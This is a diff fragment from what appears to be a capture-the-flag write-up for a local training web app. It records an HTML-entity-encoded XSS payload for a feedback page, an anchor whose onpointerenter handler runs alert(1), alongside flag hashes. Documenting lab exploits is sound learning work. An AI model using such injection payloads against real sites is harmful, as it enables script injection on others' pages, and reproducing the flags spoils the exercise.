@@ -44,7 +44,7 @@ flag: d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
 
 - XSS:
     - http://localhost:8888/?page=feedback
-    - &#60;a href=# onpointerenter=alert(1)&#62;Hover&#60;/a&#62;  (Url encoded from <a href=# onpointerenter=alert(1)>Hover me</a>)
+    - &#60;a href=# onpointerenter=alert(1)&#62;Hover&#60;/a&#62;  (Url encoded  <> from <a href=# onpointerenter=alert(1)>Hover me</a>)
     - Flag: 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
 
 ---
